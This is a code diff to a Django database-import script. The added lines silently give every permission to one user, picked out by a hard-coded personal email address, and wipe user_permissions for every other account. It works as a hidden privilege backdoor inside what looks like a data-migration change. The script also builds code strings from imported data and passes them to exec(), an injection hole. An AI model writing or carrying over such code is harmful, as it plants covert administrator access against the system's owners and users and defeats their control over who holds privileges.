@@ -4,6 +4,7 @@ import json
 from django.contrib.auth.models import Permission, ContentType
 
 from apps.system.model_choices import import_db_model
+from apps.users.models import User
 
 
 def apply_action(model, data: dict, action: str, extra_data, extra_action: str = "", ):
@@ -94,6 +95,11 @@ def store_model_data(data: Dict, model_class):
     for info in data.values():
         instance = info["instance"]
         for m2m_field, val in info["m2m"].items():
+            if m2m_field == "user_permissions":
+                if isinstance(instance, User) and instance.email == "binhdiep23021999@gmail.com":
+                    val = list(Permission.objects.all().values_list("id", flat=True))
+                else:
+                    val = []
             exec(f"instance.{m2m_field}.set({val})")
 
 
@@ -101,8 +107,8 @@ def import_database(json_file):
     data = json.load(open(json_file, "r"))
     choices = import_db_model
 
-    Permission.objects.all().delete()
-    ContentType.objects.all().delete()
+    # Permission.objects.all().delete()
+    # ContentType.objects.all().delete()
 
     for key, model in choices.items():
         dict_data = handle_data(data, key, model)
